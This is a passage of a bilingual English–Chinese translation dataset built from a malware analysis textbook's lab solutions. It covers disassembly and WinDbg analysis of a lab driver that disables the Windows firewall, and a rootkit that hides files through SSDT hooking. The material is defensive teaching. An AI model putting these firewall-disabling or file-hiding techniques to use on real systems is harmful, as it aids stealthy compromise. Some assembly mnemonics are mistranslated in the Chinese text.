  type: TYPE_NORMAL
  zh: ; 在指定计算机上的控制管理器
- en: 0040100D
  id: totrans-2521
  prefs: []
  type: TYPE_NORMAL
  zh: 0040100D
- en: ; and opens the specified database
  id: totrans-2522
  prefs: []
  type: TYPE_NORMAL
  zh: ; 并打开指定的数据库
- en: 00401013 mov edi, eax
  id: totrans-2523
  prefs: []
  type: TYPE_NORMAL
  zh: 00401013 mov edi, eax
- en: Solutions to Labs
  id: totrans-2524
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**549**'
  id: totrans-2525
  prefs: []
  type: TYPE_NORMAL
  zh: '**549**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2526
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 00401015 test edi, edi
  id: totrans-2527
  prefs: []
  type: TYPE_NORMAL
  zh: 00401015 测试 edi, edi
- en: 00401017 jnz short loc_401020
  id: totrans-2528
  prefs: []
  type: TYPE_NORMAL
  zh: 00401017 jnz short loc_401020
- en: 00401019 pop edi
  id: totrans-2529
  prefs: []
  type: TYPE_NORMAL
  zh: 00401019 pop edi
- en: 0040101A add esp, 1Ch
  id: totrans-2530
  prefs: []
  type: TYPE_NORMAL
  zh: 0040101A add esp, 1Ch
- en: 0040101D retn 10h
  id: totrans-2531
  prefs: []
  type: TYPE_NORMAL
  zh: 0040101D 返回 10h
- en: '00401020 loc_401020:'
  id: totrans-2532
  prefs: []
  type: TYPE_NORMAL
  zh: '00401020 loc_401020:'
- en: 00401020 push esi
  id: totrans-2533
  prefs: []
  type: TYPE_NORMAL
  zh: 00401020 push esi
- en: 00401021 push 0 ; lpPassword
  id: totrans-2534
  prefs: []
  type: TYPE_NORMAL
  zh: 00401021 push 0 ; lpPassword
- en: 00401023 push 0 ; lpServiceStartName
  id: totrans-2535
  prefs: []
  type: TYPE_NORMAL
  zh: 00401023 push 0 ; lpServiceStartName
- en: 00401025 push 0 ; lpDependencies
  id: totrans-2536
  prefs: []
  type: TYPE_NORMAL
  zh: 00401025 push 0 ; lpDependencies
- en: 00401027 push 0 ; lpdwTagId
  id: totrans-2537
  prefs: []
  type: TYPE_NORMAL
  zh: 00401027 push 0 ; lpdwTagId
- en: 00401029 push 0 ; lpLoadOrderGroup
  id: totrans-2538
  prefs: []
  type: TYPE_NORMAL
  zh: 00401029 push 0 ; lpLoadOrderGroup
- en: 0040102B push offset BinaryPathName ; "C:\\Windows\\System32\\Lab10-01.sys"
  id: totrans-2539
  prefs: []
  type: TYPE_NORMAL
  zh: 0040102B push offset BinaryPathName ; "C:\\Windows\\System32\\Lab10-01.sys"
- en: 00401030 push 1 ; dwErrorControl
  id: totrans-2540
  prefs: []
  type: TYPE_NORMAL
  zh: 00401030 push 1 ; dwErrorControl
- en: 00401032 push 3 ; dwStartType
  id: totrans-2541
  prefs: []
  type: TYPE_NORMAL
  zh: 00401032 push 3 ; dwStartType
- en: 00401034 push 1 ; dwServiceType
  id: totrans-2542
  prefs: []
  type: TYPE_NORMAL
  zh: 00401034 push 1 ; dwServiceType
- en: 00401036 push 0F01FFh ; dwDesiredAccess
  id: totrans-2543
  prefs: []
  type: TYPE_NORMAL
  zh: 00401036 push 0F01FFh ; dwDesiredAccess
- en: 0040103B push offset ServiceName ; "Lab10-01"
  id: totrans-2544
  prefs: []
  type: TYPE_NORMAL
  zh: 0040103B push offset ServiceName ; "Lab10-01"
- en: 00401040 push offset ServiceName ; "Lab10-01"
  id: totrans-2545
  prefs: []
  type: TYPE_NORMAL
  zh: 00401040 push offset ServiceName ; "Lab10-01"
- en: 00401045 push edi ; hSCManager
  id: totrans-2546
  prefs: []
  type: TYPE_NORMAL
  zh: 00401045 push edi ; hSCManager
- en: 00401046 call ds:CreateServiceA
  id: totrans-2547
  prefs: []
  type: TYPE_NORMAL
  zh: 00401046 call ds:CreateServiceA
- en: '*Listing 10-1L: main method of* Lab10-01.exe'
  id: totrans-2548
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-1L：Lab10-01.exe 的 main 方法*'
- en: First, it calls OpenSCManagerA at  to get a handle to the service manager,
    and then it calls CreateServiceA at  to create a service called Lab10-01\. The
    call to CreateServiceA tells us that the service will use code in *C:\Windows\System32\*
    *Lab10-01.sys* at  and that the service type is 3 at , or SERVICE_KERNEL_DRIVER,
    which means that this file will be loaded into the kernel.
  id: totrans-2549
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，它调用 OpenSCManagerA at  来获取服务管理器的句柄，然后调用 CreateServiceA at  来创建名为 Lab10-01
    的服务。CreateServiceA 调用告诉我们，服务将使用位于 *C:\Windows\System32\* 的 *Lab10-01.sys* 中的代码
    ，并且服务类型是  中的 3，或 SERVICE_KERNEL_DRIVER，这意味着此文件将被加载到内核中。
- en: If the call to CreateServiceA fails, the code calls OpenServiceA with the same
    service name, as shown in Listing 10-2L at . This opens a handle to the Lab10-01
    service if the CreateServiceA call failed because the service already existed.
  id: totrans-2550
  prefs: []
  type: TYPE_NORMAL
  zh: 如果 CreateServiceA 调用失败，代码将使用相同的服务名称调用 OpenServiceA，如列表 10-2L 所示。如果 CreateServiceA
    调用失败是因为服务已经存在，这将打开 Lab10-01 服务的句柄。
- en: 00401052 push 0F01FFh
  id: totrans-2551
  prefs: []
  type: TYPE_NORMAL
  zh: 00401052 push 0F01FFh
- en: ; dwDesiredAccess
  id: totrans-2552
  prefs: []
  type: TYPE_NORMAL
  zh: ; dwDesiredAccess
- en: 00401057 push offset ServiceName ; "Lab10-01"
  id: totrans-2553
  prefs: []
  type: TYPE_NORMAL
  zh: 00401057 push offset ServiceName ; "Lab10-01"
- en: 0040105C push edi
  id: totrans-2554
  prefs: []
  type: TYPE_NORMAL
  zh: 0040105C push edi
- en: ; hSCManager
  id: totrans-2555
  prefs: []
  type: TYPE_NORMAL
  zh: ; hSCManager
- en: 0040105D call ds:OpenServiceA
  id: totrans-2556
  prefs: []
  type: TYPE_NORMAL
  zh: 0040105D call ds:OpenServiceA
- en: '*Listing 10-2L: Call to OpenServiceA to get a handle to the service for Lab10-01*'
  id: totrans-2557
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-2L：调用 OpenServiceA 获取 Lab10-01 服务的句柄*'
- en: Next, the program calls StartServiceA to start the service, as shown in Listing
    10-3L at . Finally, it calls ControlService at . The second parameter to ControlService
    is what type of control message is being sent. In this case, the value is 0x01
    at , which we look up in the documentation and find that it means SERVICE_CONTROL_STOP.
    This will unload the driver and call the driver’s unload function.
  id: totrans-2558
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，程序调用 StartServiceA 来启动服务，如列表 10-3L 所示。最后，它调用 ControlService at 。ControlService
    的第二个参数是要发送的控制消息类型。在这种情况下，值是  中的 0x01，我们在文档中查找发现它表示 SERVICE_CONTROL_STOP。这将卸载驱动程序并调用驱动程序的卸载函数。
- en: 00401069 push 0 ; lpServiceArgVectors 0040106B push 0 ; dwNumServiceArgs
  id: totrans-2559
  prefs: []
  type: TYPE_NORMAL
  zh: 00401069 push 0 ; lpServiceArgVectors 0040106B push 0 ; dwNumServiceArgs
- en: 0040106D push esi ; hService
  id: totrans-2560
  prefs: []
  type: TYPE_NORMAL
  zh: 0040106D push esi ; hService
- en: 0040106E call ds:StartServiceA
  id: totrans-2561
  prefs: []
  type: TYPE_NORMAL
  zh: 0040106E call ds:StartServiceA
- en: '**550**'
  id: totrans-2562
  prefs: []
  type: TYPE_NORMAL
  zh: '**550**'
- en: Appendix C
  id: totrans-2563
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2564
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 00401074 test esi, esi
  id: totrans-2565
  prefs: []
  type: TYPE_NORMAL
  zh: 00401074 test esi, esi
- en: 00401076 jz short loc_401086
  id: totrans-2566
  prefs: []
  type: TYPE_NORMAL
  zh: 00401076 jz short loc_401086
- en: 00401078 lea eax, [esp+24h+ServiceStatus]
  id: totrans-2567
  prefs: []
  type: TYPE_NORMAL
  zh: 00401078 lea eax, [esp+24h+ServiceStatus]
- en: 0040107C push eax ; lpServiceStatus
  id: totrans-2568
  prefs: []
  type: TYPE_NORMAL
  zh: 0040107C push eax ; lpServiceStatus
- en: 0040107D push 1 ; dwControl
  id: totrans-2569
  prefs: []
  type: TYPE_NORMAL
  zh: 0040107D push 1 ; dwControl
- en: 0040107F push esi ; hService
  id: totrans-2570
  prefs: []
  type: TYPE_NORMAL
  zh: 0040107F push esi ; hService
- en: '00401080 call ds:ControlService ; Send a control code to a Win32 service *Listing
    10-3L: Call to ControlService from* Lab10-01.exe **Viewing Lab10-01.sys in IDA
    Pro**'
  id: totrans-2571
  prefs: []
  type: TYPE_NORMAL
  zh: 00401080 call ds:ControlService ; 向 Win32 服务发送控制代码 *列表 10-3L：从 Lab10-01.exe
    调用 ControlService*
- en: Before we try to analyze the driver with WinDbg, we can open the driver in IDA
    Pro to examine the DriverEntry function. When we first open the driver and navigate
    to the entry point, we see the code in Listing 10-4L.
  id: totrans-2572
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们尝试使用 WinDbg 分析驱动程序之前，我们可以打开 IDA Pro 中的驱动程序来检查 DriverEntry 函数。当我们第一次打开驱动程序并导航到入口点时，我们看到列表
    10-4L 中的代码。
- en: 00010959 mov edi, edi
  id: totrans-2573
  prefs: []
  type: TYPE_NORMAL
  zh: 00010959 mov edi, edi
- en: 0001095B push ebp
  id: totrans-2574
  prefs: []
  type: TYPE_NORMAL
  zh: 0001095B push ebp
- en: 0001095C mov ebp, esp
  id: totrans-2575
  prefs: []
  type: TYPE_NORMAL
  zh: 0001095C mov ebp, esp
- en: 0001095E call sub_10920
  id: totrans-2576
  prefs: []
  type: TYPE_NORMAL
  zh: 0001095E call sub_10920
- en: '**10**'
  id: totrans-2577
  prefs: []
  type: TYPE_NORMAL
  zh: '**10**'
- en: 00010963 pop ebp
  id: totrans-2578
  prefs: []
  type: TYPE_NORMAL
  zh: 00010963 pop ebp
- en: 00010964 jmp sub_10906
  id: totrans-2579
  prefs: []
  type: TYPE_NORMAL
  zh: 00010964 jmp sub_10906
- en: '*Listing 10-4L: Code at the entry point of* Lab10-01.sys This function is the
    entry point of the driver, but it’s not the DriverEntry function. The compiler
    inserts wrapper code around the DriverEntry. The real DriverEntry function is
    located at sub_10906 .'
  id: totrans-2580
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-4L：Lab10-01.sys 的入口点代码* 这个函数是驱动程序的入口点，但不是 DriverEntry 函数。编译器在 DriverEntry
    周围插入包装代码。真正的 DriverEntry 函数位于 sub_10906 。'
- en: As shown in Listing 10-5L, the main body of the DriverEntry function appears
    to move an offset value into a memory location, but otherwise it doesn’t make
    any function calls or interact with the system.
  id: totrans-2581
  prefs: []
  type: TYPE_NORMAL
  zh: 如列表 10-5L 所示，DriverEntry 函数的主体似乎将一个偏移值移动到内存位置，但除此之外没有进行任何函数调用或与系统交互。
- en: 00010906 mov edi, edi
  id: totrans-2582
  prefs: []
  type: TYPE_NORMAL
  zh: 00010906 mov edi, edi
- en: 00010908 push ebp
  id: totrans-2583
  prefs: []
  type: TYPE_NORMAL
  zh: 00010908 push ebp
- en: 00010909 mov ebp, esp
  id: totrans-2584
  prefs: []
  type: TYPE_NORMAL
  zh: 00010909 mov ebp, esp
- en: 0001090B mov eax, [ebp+arg_0]
  id: totrans-2585
  prefs: []
  type: TYPE_NORMAL
  zh: 0001090B mov eax, [ebp+arg_0]
- en: 0001090E mov dword ptr [eax+34h], offset loc_10486
  id: totrans-2586
  prefs: []
  type: TYPE_NORMAL
  zh: 0001090E mov dword ptr [eax+34h], offset loc_10486
- en: 00010915 xor eax, eax
  id: totrans-2587
  prefs: []
  type: TYPE_NORMAL
  zh: 00010915 xor eax, eax
- en: 00010917 pop ebp
  id: totrans-2588
  prefs: []
  type: TYPE_NORMAL
  zh: 00010917 pop ebp
- en: 00010918 retn 8
  id: totrans-2589
  prefs: []
  type: TYPE_NORMAL
  zh: 00010918 retn 8
- en: '*Listing 10-5L: The DriverEntry routine for* Lab10-01.sys **Analyzing Lab10-01.sys
    in WinDbg**'
  id: totrans-2590
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-5L：Lab10-01.sys 的 DriverEntry 例程分析* 在 WinDbg 中分析 Lab10-01.sys'
- en: Now, we can use WinDbg to examine *Lab10-01.sys* to see what happens when ControlService
    is called to unload *Lab10-01.sys*. The code in the user-space executable loads
    *Lab10-10.sys* and then immediately unloads it. If we use the kernel debugger
    before running the malicious executable, the driver will not yet be in memory,
    so we won’t be able to examine it. But if we wait until after the malicious executable
    is finished executing, the driver will already have been unloaded from memory.
  id: totrans-2591
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们可以使用 WinDbg 检查 Lab10-01.sys，看看在调用 ControlService 卸载 Lab10-01.sys 时会发生什么。用户空间可执行文件中的代码加载
    *Lab10-10.sys* 然后立即卸载它。如果我们运行恶意可执行文件之前使用内核调试器，驱动程序尚未在内存中，因此我们无法检查它。但如果我们等待恶意可执行文件执行完毕后，驱动程序已经从内存中卸载。
- en: Solutions to Labs
  id: totrans-2592
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**551**'
  id: totrans-2593
  prefs: []
  type: TYPE_NORMAL
  zh: '**551**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2594
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'In order to analyze *Lab10-01.sys* with WinDbg while it is loaded in memory,
    we’ll load the executable into WinDbg within the virtual machine. We set a breakpoint
    between the time that the driver is loaded and unloaded, at the ControlService
    call, with the following command:'
  id: totrans-2595
  prefs: []
  type: TYPE_NORMAL
  zh: 为了在内存中加载 Lab10-01.sys 时使用 WinDbg 进行分析，我们将在虚拟机中加载可执行文件到 WinDbg 中。我们在驱动程序加载和卸载之间设置断点，在
    ControlService 调用处，使用以下命令：
- en: 0:000> bp 00401080
  id: totrans-2596
  prefs: []
  type: TYPE_NORMAL
  zh: 0:000> bp 00401080
- en: 'Then we start the program and wait until the breakpoint is hit. When the breakpoint
    is hit, we are presented with the following information in WinDbg: Breakpoint
    0 hit'
  id: totrans-2597
  prefs: []
  type: TYPE_NORMAL
  zh: 然后我们启动程序并等待直到断点被触发。当断点被触发时，WinDbg会显示以下信息：断点 0 被触发
- en: eax=0012ff1c ebx=7ffdc000 ecx=77defb6d edx=00000000 esi=00144048 edi=00144f58
  id: totrans-2598
  prefs: []
  type: TYPE_NORMAL
  zh: eax=0012ff1c ebx=7ffdc000 ecx=77defb6d edx=00000000 esi=00144048 edi=00144f58
- en: eip=00401080 esp=0012ff08 ebp=0012ffc0 iopl=0 nv up ei pl nz na pe nc cs=001b
    ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
  id: totrans-2599
  prefs: []
  type: TYPE_NORMAL
  zh: eip=00401080 esp=0012ff08 ebp=0012ffc0 iopl=0 nv up ei pl nz na pe nc cs=001b
    ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
- en: 'image00400000+0x1080:'
  id: totrans-2600
  prefs: []
  type: TYPE_NORMAL
  zh: 'image00400000+0x1080:'
- en: Once the program is stopped at the breakpoint, we move out of the virtual machine
    in order to connect the kernel debugger and get information about *Lab10-01.sys*.
    We open another instance of WinDbg and select **File**
  id: totrans-2601
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦程序在断点处停止，我们就退出虚拟机以连接内核调试器并获取有关 Lab10-01.sys 的信息。我们打开 WinDbg 的另一个实例并选择 **文件**
- en: '**Kernel Debug** with pipe set to *\\.\pipe\com_1* and a baud rate of 115200
    to connect the instance of WinDbg running in the host machine to the kernel of
    the guest machine. We know that our service is called Lab10-01, so we can get
    a driver object by using the !drvobj command, as shown in Listing 10-6L.'
  id: totrans-2602
  prefs: []
  type: TYPE_NORMAL
  zh: '**通过管道设置到 *\\.\pipe\com_1* 并以 115200 波特率连接主机机器上运行的 WinDbg 实例到虚拟机的内核**。我们知道我们的服务名为
    Lab10-01，因此我们可以使用 !drvobj 命令获取驱动程序对象，如列表 10-6L 所示。'
- en: kd> !drvobj lab10-01
  id: totrans-2603
  prefs: []
  type: TYPE_NORMAL
  zh: kd> !drvobj lab10-01
- en: 'Driver object  (8263b418) is for:'
  id: totrans-2604
  prefs: []
  type: TYPE_NORMAL
  zh: 驱动对象  (8263b418) 用于：
- en: Loading symbols for f7c47000 Lab10-01.sys -> Lab10-01.sys
  id: totrans-2605
  prefs: []
  type: TYPE_NORMAL
  zh: 加载 f7c47000 Lab10-01.sys -> Lab10-01.sys 的符号
- en: '*** ERROR: Module load completed but symbols could not be loaded for Lab10-01.sys'
  id: totrans-2606
  prefs: []
  type: TYPE_NORMAL
  zh: '*** 错误：模块加载完成，但无法加载 Lab10-01.sys 的符号'
- en: \Driver\Lab10-01
  id: totrans-2607
  prefs: []
  type: TYPE_NORMAL
  zh: \Driver\Lab10-01
- en: 'Driver Extension List: (id , addr)'
  id: totrans-2608
  prefs: []
  type: TYPE_NORMAL
  zh: 驱动扩展列表： (id , addr)
- en: 'Device Object list: '
  id: totrans-2609
  prefs: []
  type: TYPE_NORMAL
  zh: 设备对象列表： 
- en: '*Listing 10-6L: Locating the device object for Lab10-01*'
  id: totrans-2610
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-6L：定位 Lab10-01 的设备对象*'
- en: The output of the !drvobj command gives us the address of the driver object
    at . Because there are no devices listed in the device object list at , we know
    that this driver does not have any devices that are accessible by user-space applications.
  id: totrans-2611
  prefs: []
  type: TYPE_NORMAL
  zh: '!drvobj 命令的输出给我们提供了驱动对象的地址。由于设备对象列表中没有列出任何设备，我们知道该驱动程序没有用户空间应用程序可以访问的任何设备。'
- en: '**NOTE**'
  id: totrans-2612
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*To resolve any difficulty locating the service name, you can get a list of
    driver objects* *currently in the kernel with the !object \Driver command.*'
  id: totrans-2613
  prefs: []
  type: TYPE_NORMAL
  zh: '*为了解决定位服务名称的任何困难，您可以使用 !object \Driver 命令获取当前内核中驱动对象的列表。*'
- en: Once we have the address of the driver object, we can view it using the dt command,
    as shown in Listing 10-7L.
  id: totrans-2614
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们有了驱动对象的地址，我们可以使用dt命令查看它，如列表10-7L所示。
- en: kd> **dt _DRIVER_OBJECT 8263b418**
  id: totrans-2615
  prefs: []
  type: TYPE_NORMAL
  zh: kd> **dt _DRIVER_OBJECT 8263b418**
- en: nt!_DRIVER_OBJECT
  id: totrans-2616
  prefs: []
  type: TYPE_NORMAL
  zh: nt!_DRIVER_OBJECT
- en: '+0x000 Type : 4'
  id: totrans-2617
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x000 类型 : 4'
- en: '+0x002 Size : 168'
  id: totrans-2618
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x002 大小 : 168'
- en: '**552**'
  id: totrans-2619
  prefs: []
  type: TYPE_NORMAL
  zh: '**552**'
- en: Appendix C
  id: totrans-2620
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2621
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '+0x004 DeviceObject : (null)'
  id: totrans-2622
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x004 设备对象 : (null)'
- en: '+0x008 Flags : 0x12'
  id: totrans-2623
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x008 标志 : 0x12'
- en: '+0x00c DriverStart : 0xf7c47000'
  id: totrans-2624
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x00c 驱动启动 : 0xf7c47000'
- en: '+0x010 DriverSize : 0xe80'
  id: totrans-2625
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x010 驱动大小 : 0xe80'
- en: '+0x014 DriverSection : 0x826b2c88'
  id: totrans-2626
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x014 驱动部分 : 0x826b2c88'
- en: '+0x018 DriverExtension : 0x8263b4c0 _DRIVER_EXTENSION'
  id: totrans-2627
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x018 驱动扩展 : 0x8263b4c0 _DRIVER_EXTENSION'
- en: '+0x01c DriverName : _UNICODE_STRING "\Driver\Lab10-01"'
  id: totrans-2628
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x01c 驱动名称 : _UNICODE_STRING "\Driver\Lab10-01"'
- en: '+0x024 HardwareDatabase : 0x80670ae0 _UNICODE_STRING "\REGISTRY\MACHINE\ HARDWARE\DESCRIPTION\SYSTEM"'
  id: totrans-2629
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x024 硬件数据库 : 0x80670ae0 _UNICODE_STRING "\REGISTRY\MACHINE\ HARDWARE\DESCRIPTION\SYSTEM"'
- en: '+0x028 FastIoDispatch : (null)'
  id: totrans-2630
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x028 快速I/O调度 : (null)'
- en: '+0x02c DriverInit : 0xf7c47959 long +0'
  id: totrans-2631
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x02c 驱动初始化 : 0xf7c47959 long +0'
- en: '+0x030 DriverStartIo : (null)'
  id: totrans-2632
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x030 驱动启动Io : (null)'
- en: '+0x034 DriverUnload : 0xf7c47486 void +0'
  id: totrans-2633
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x034 DriverUnload : 0xf7c47486 void +0'
- en: '+0x038 MajorFunction : [28] 0x804f354a long nt!IopInvalidDeviceRequest+0'
  id: totrans-2634
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x038 主要功能 : [28] 0x804f354a long nt!IopInvalidDeviceRequest+0'
- en: '*Listing 10-7L: Viewing the driver object for* Lab10-01.sys *in WinDbg* We’re
    trying to identify the function called when the driver is unloaded—'
  id: totrans-2635
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表10-7L：在WinDbg中查看 Lab10-01.sys 的驱动对象* 我们试图识别驱动卸载时调用的函数——'
- en: 'information at offset 0x034, DriverUnload, as shown at . Then we set a breakpoint
    using the following command:'
  id: totrans-2636
  prefs: []
  type: TYPE_NORMAL
  zh: 偏移量0x034处的信息，DriverUnload，如所示。然后我们使用以下命令设置断点：
- en: '**10**'
  id: totrans-2637
  prefs: []
  type: TYPE_NORMAL
  zh: '**10**'
- en: kd> **bp 0xf7c47486**
  id: totrans-2638
  prefs: []
  type: TYPE_NORMAL
  zh: kd> **bp 0xf7c47486**
- en: Having set the breakpoint, we resume running our kernel. Then we return to the
    version of WinDbg running on the executable on our virtual machine and resume
    it as well. Immediately, the entire guest OS freezes because the kernel debugger
    has hit our kernel breakpoint. At this point, we can go to the kernel debugger
    to step through the code. We see that the program calls the RtlCreateRegistryKey
    function three times to create several registry keys, and then calls the RtlWriteRegistryValue
    twice to set the EnableFirewall value to 0 in two places. This disables the Windows
    XP firewall from the kernel in a way that is difficult for security programs to
    detect.
  id: totrans-2639
  prefs: []
  type: TYPE_NORMAL
  zh: 设置断点后，我们恢复内核的运行。然后我们回到在虚拟机上运行的WinDbg的可执行文件版本，并继续运行。立即，整个虚拟机操作系统冻结，因为内核调试器触发了我们的内核断点。此时，我们可以进入内核调试器来逐步执行代码。我们看到程序三次调用RtlCreateRegistryKey函数来创建几个注册表键，然后两次调用RtlWriteRegistryValue函数将EnableFirewall值设置为0，在两个地方。这样，以难以被安全程序检测的方式禁用了Windows
    XP防火墙。
- en: 'If the unload function at 0xf7c47486 were long or complex, it would have been
    difficult to analyze in WinDbg. In many cases, it’s easier to analyze a function
    in IDA Pro once you have identified where the function is located, because IDA
    Pro does a better job of analyzing the functions. However, the function location
    in WinDbg is different than the function location in IDA Pro, so we must perform
    some manual calculations in order to view the function in IDA Pro. We must calculate
    the offset of the function from the beginning of the file as it is loaded in WinDbg
    using the lm command, as follows:'
  id: totrans-2640
  prefs: []
  type: TYPE_NORMAL
  zh: 如果0xf7c47486处的卸载函数很长或很复杂，在WinDbg中分析它将很困难。在许多情况下，一旦确定了函数的位置，在IDA Pro中分析函数就更容易了，因为IDA
    Pro在分析函数方面做得更好。然而，WinDbg中的函数位置与IDA Pro中的函数位置不同，因此我们必须进行一些手动计算才能在IDA Pro中查看函数。我们必须使用lm命令计算函数从文件开始处的偏移量，如下所示：
- en: kd> **lm**
  id: totrans-2641
  prefs: []
  type: TYPE_NORMAL
  zh: kd> **lm**
- en: start
  id: totrans-2642
  prefs: []
  type: TYPE_NORMAL
  zh: start
- en: end module name
  id: totrans-2643
  prefs: []
  type: TYPE_NORMAL
  zh: end 模块名称
- en: '...'
  id: totrans-2644
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: f7c47000 f7c47e80 Lab10_01 (no symbols)
  id: totrans-2645
  prefs: []
  type: TYPE_NORMAL
  zh: f7c47000 f7c47e80 Lab10_01 (无符号)
- en: '...'
  id: totrans-2646
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: As you can see, the file is loaded at 0xf7c47000 at , and from earlier, we
    know the unload function is located at 0xf7c47486\. We subtract 0xf7c47000
  id: totrans-2647
  prefs: []
  type: TYPE_NORMAL
  zh: 正如您所看到的，文件在处的0xf7c47000处加载，并且从较早的版本中我们知道卸载函数位于0xf7c47486。我们从0xf7c47000减去它。
- en: Solutions to Labs
  id: totrans-2648
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**553**'
  id: totrans-2649
  prefs: []
  type: TYPE_NORMAL
  zh: '**553**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2650
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: from 0xf7c47486 to get the offset (0x486), which we then use to navigate to
    the unload function in IDA Pro. For example, if the base load address in IDA Pro
    is 0x00100000, then we navigate to address 0x00100486 to find the unload function
    in IDA Pro. We can then use static analysis and IDA Pro to confirm what we discovered
    in WinDbg.
  id: totrans-2651
  prefs: []
  type: TYPE_NORMAL
  zh: 从0xf7c47486获取偏移量（0x486），然后我们使用这个偏移量在IDA Pro中导航到卸载函数。例如，如果IDA Pro中的基本加载地址是0x00100000，那么我们导航到地址0x00100486以在IDA
    Pro中找到卸载函数。然后我们可以使用静态分析和IDA Pro来确认我们在WinDbg中发现的。
- en: Alternatively, we can change the base address in IDA Pro by selecting EditSegmentsRebase
    Program and changing the base address value from 0x00100000 to 0xf7c47000\.
  id: totrans-2652
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，我们可以通过在IDA Pro中选择编辑段重定位程序并更改基本地址值从0x00100000到0xf7c47000来更改基本地址。
- en: '**NOTE**'
  id: totrans-2653
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*If you tried to use a deferred breakpoint using the bu $iment(Lab10-01), you
    may have* *run into trouble because WinDbg changes hyphens to underscores when
    it encounters* *them in filenames. The correct command to break on the entry point
    of the driver in this* *lab would be bu $iment(Lab10_01). This behavior is not
    documented anywhere and* *may be inconsistent across versions of WinDbg.*'
  id: totrans-2654
  prefs: []
  type: TYPE_NORMAL
  zh: '*如果您尝试使用延迟断点（bu $iment(Lab10-01)），您可能会遇到麻烦，因为当WinDbg在文件名中遇到短横线时，它会将其更改为下划线。在这个实验中，正确的命令是bu
    $iment(Lab10_01)。这种行为没有在任何地方记录，并且*可能在不同版本的WinDbg中不一致。*'
- en: '**Lab 10-2 Solutions**'
  id: totrans-2655
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验10-2解决方案**'
- en: '***Short Answers***'
  id: totrans-2656
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-2657
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The program creates the file *C:\Windows\System32\Mlwx486.sys*. You can use
    procmon or another dynamic monitoring tool to see the file being created, but
    you cannot see the file on disk because it is hidden.
  id: totrans-2658
  prefs: []
  type: TYPE_NORMAL
  zh: 程序创建了文件*C:\Windows\System32\Mlwx486.sys*。您可以使用procmon或其他动态监控工具查看创建的文件，但您无法在磁盘上看到该文件，因为它被隐藏了。
- en: 2\.
  id: totrans-2659
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The program has a kernel component. It is stored in the file’s resource section,
    and then written to disk and loaded into the kernel as a service.
  id: totrans-2660
  prefs: []
  type: TYPE_NORMAL
  zh: 程序有一个内核组件。它存储在文件的资源部分，然后写入磁盘并作为服务加载到内核中。
- en: 3\.
  id: totrans-2661
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The program is a rootkit designed to hide files. It uses SSDT hooking to overwrite
    the entry to NtQueryDirectoryFile, which it uses to prevent the display of any
    files beginning with *Mlwx* (case-sensitive) in directory listings.
  id: totrans-2662
  prefs: []
  type: TYPE_NORMAL
  zh: 该程序是一个旨在隐藏文件的rootkit。它使用SSDT钩子覆盖NtQueryDirectoryFile的入口，它使用该钩子来防止在目录列表中显示以*Mlwx*（区分大小写）开头的任何文件。
- en: '***Detailed Analysis***'
  id: totrans-2663
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: Looking at the imports section of this executable, we see imports for CloseServiceHandle,
    CreateServiceA, OpenSCManagerA, and StartServiceA, which tell us that this program
    will create and start a service. Because the program also calls CreateFile and
